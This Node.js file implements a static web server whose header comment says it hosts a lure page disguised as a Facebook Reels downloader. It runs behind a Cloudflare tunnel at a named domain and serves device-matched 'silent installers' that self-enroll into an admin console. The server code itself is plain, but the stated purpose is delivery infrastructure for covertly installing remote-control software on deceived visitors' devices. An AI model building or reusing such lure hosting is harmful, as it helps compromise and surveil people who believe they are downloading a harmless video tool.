'use strict';

/**
 * Reels Downloader - tiny static host for the Facebook-Reels-disguised lure page.
 *
 * Served behind the Cloudflare tunnel at reels.telcom.stream. No backend: the
 * page auto-detects the device and hands the matching silent installer from the
 * panel, which already self-enrolls and connects to the admin console.
 */

const http = require('http');
const fs = require('fs');
const path = require('path');

const ROOT = __dirname;
const PORT = parseInt(process.env.REELS_PORT || '3300', 10);
const HOST = process.env.REELS_HOST || '127.0.0.1';

const MIME = {
    '.html': 'text/html; charset=utf-8',
    '.css': 'text/css; charset=utf-8',
    '.js': 'application/javascript; charset=utf-8',
    '.svg': 'image/svg+xml',
    '.png': 'image/png',
    '.ico': 'image/x-icon',
    '.json': 'application/json; charset=utf-8'
};

function send(res, status, headers, body) {
    res.writeHead(status, headers);
    res.end(body);
}

const server = http.createServer((req, res) => {
    let pathname;
    try { pathname = decodeURIComponent(new URL(req.url, 'http://localhost').pathname); }
    catch { pathname = '/'; }

    if (pathname === '/healthz' || pathname === '/api/health') {
        return send(res, 200, { 'Content-Type': 'application/json', 'Cache-Control': 'no-store' },
            JSON.stringify({ ok: true, service: 'reels' }));
    }

    if (pathname === '/' || pathname === '') pathname = '/index.html';
    const file = path.resolve(ROOT, '.' + pathname);
    if (!file.startsWith(path.resolve(ROOT))) {
        return send(res, 403, { 'Content-Type': 'text/plain' }, 'Forbidden');
    }

    fs.stat(file, (err, stat) => {
        if (err || !stat.isFile()) {
            return send(res, 404, { 'Content-Type': 'text/plain; charset=utf-8' }, 'Not found');
        }
        const ext = path.extname(file).toLowerCase();
        res.writeHead(200, {
            'Content-Type': MIME[ext] || 'application/octet-stream',
            'Content-Length': stat.size,
            'Cache-Control': ext === '.html' ? 'no-cache' : 'public, max-age=3600',
            'X-Content-Type-Options': 'nosniff'
        });
        fs.createReadStream(file).pipe(res);
    });
});

server.listen(PORT, HOST, () => {
    console.log('[reels] listening http://' + HOST + ':' + PORT + ' root=' + ROOT);
});
